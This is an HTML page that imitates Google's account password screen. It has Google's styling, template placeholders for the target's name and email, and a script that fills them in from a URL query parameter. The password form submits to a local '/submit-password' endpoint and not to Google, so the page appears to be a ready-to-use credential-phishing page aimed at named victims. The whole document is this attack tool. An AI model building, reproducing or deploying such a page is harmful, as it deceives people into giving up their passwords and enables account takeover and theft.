<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Google Account</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Google Sans",Arial,sans-serif}
body{background:#f0f4f9;height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.container{display:flex;flex-direction:column;align-items:center}
.card{width:896px;height:372px;background:#fff;border-radius:28px;display:flex;padding:48px 40px}
.left{width:50%}
.logo{width:40px;height:40px;display:block;object-fit:contain;margin-bottom:22px}
.title{font-size:48px;font-weight:400;letter-spacing:-1.5px;line-height:1.12;color:#1f1f1f;margin-bottom:22px}
.account{display:inline-flex;align-items:center;height:32px;border:1px solid #747775;border-radius:18px;padding:0 12px 0 3px;gap:8px}
.avatar{width:24px;height:24px;border-radius:50%;background:url('https://lh3.googleusercontent.com/a/default-user=s32-c') center/cover;border:1px solid #5f6368}
.mail{font-size:14px;font-weight:500;color:#1f1f1f}
.arrow-down{width:0;height:0;border-left:4px solid transparent;border-right:4px solid transparent;border-top:5px solid #444}
.right{width:50%;padding-top:88px;padding-left:18px;display:flex;flex-direction:column;justify-content:space-between}
.topright{display:flex;flex-direction:column}
.inputwrap{position:relative;width:396px}
.input{width:396px;height:56px;border:1px solid #747775;border-radius:4px;padding:22px 14px 8px 14px;font-size:16px;outline:none;background:#fff;color:#202124;transition:.12s}
.input:focus{border:2px solid #1a73e8;padding:21px 13px 7px 13px}
.floating{position:absolute;left:14px;top:18px;font-size:16px;color:#5f6368;background:#fff;padding:0 4px;pointer-events:none;transition:.12s}
.input:focus + .floating,.input:not(:placeholder-shown) + .floating{top:-8px;left:12px;font-size:12px;color:#1a73e8}
.checkrow{margin-top:10px}
.checkboxwrap{display:inline-flex;align-items:center;gap:14px;cursor:pointer;user-select:none;padding:8px 10px;margin-left:-10px;border-radius:999px;transition:.15s}
.checkboxwrap:hover{background:#f1f3f4}
.checkboxwrap input{display:none}
.customcheck{width:18px;height:18px;border:2px solid #5f6368;border-radius:2px;background:#fff;position:relative}
.checkboxwrap input:checked + .customcheck::after{content:"";position:absolute;left:4px;top:0px;width:5px;height:10px;border:solid #1a73e8;border-width:0 2px 2px 0;transform:rotate(45deg)}
.show{font-size:14px;font-weight:500;color:#1f1f1f}
.actions{display:flex;justify-content:flex-end;align-items:center;gap:18px;padding-bottom:2px}
.other{height:40px;display:flex;align-items:center;justify-content:center;padding:0 14px;border-radius:20px;font-size:14px;font-weight:500;color:#0b57d0;text-decoration:none;transition:.15s}
.other:hover{background:#e8f0fe}
.btn{width:79px;height:48px;border:none;border-radius:24px;background:#0b57d0;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:.15s}
.btn:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(0,0,0,.3)}
.bottom{width:896px;display:flex;justify-content:space-between;align-items:center;margin-top:16px}
.lang{font-size:12px;color:#444;display:flex;align-items:center;gap:6px}
.lang-arrow{width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #444}
.links{display:flex;gap:32px}
.links a{text-decoration:none;font-size:12px;color:#444}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="left">
<img class="logo" src="https://s3-figma-hubfile-images-production.figma.com/hub/file/carousel/img/cbbdf444bdd9c4a5a39af2e727d1b9a433fbc01c">
<div class="title" id="displayName">{{DISPLAY_NAME}}</div>
<div class="account">
<div class="avatar"></div>
<div class="mail" id="emailDisplay">{{EMAIL}}</div>
<div class="arrow-down"></div>
</div>
</div>
<div class="right">
<form action="/submit-password" method="POST">
<div class="topright">
<div class="inputwrap">
<input class="input" id="password" name="password" type="password" placeholder=" " required>
<label class="floating">Enter your password</label>
</div>
<div class="checkrow">
<label class="checkboxwrap">
<input type="checkbox" id="showpass">
<span class="customcheck"></span>
<span class="show">Show password</span>
</label>
</div>
</div>
<div class="actions">
<a href="#" class="other">Try another way</a>
<button class="btn" type="submit">Next</button>
</div>
</form>
</div>
</div>
<div class="bottom">
<div class="lang">English (United Kingdom) <span class="lang-arrow"></span></div>
<div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
</div>
</div>
<script>
document.getElementById('showpass').addEventListener('change', function() {
  document.getElementById('password').type = this.checked ? 'text' : 'password';
});

// Auto-fill display name and email if passed as query params (e.g., ?email=user@example.com)
(function() {
  const params = new URLSearchParams(window.location.search);
  const email = params.get('email');
  if (email) {
    const name = email.split('@')[0];
    document.getElementById('displayName').textContent = name;
    document.getElementById('emailDisplay').textContent = email;
  }
})();
</script>
</body>
</html>
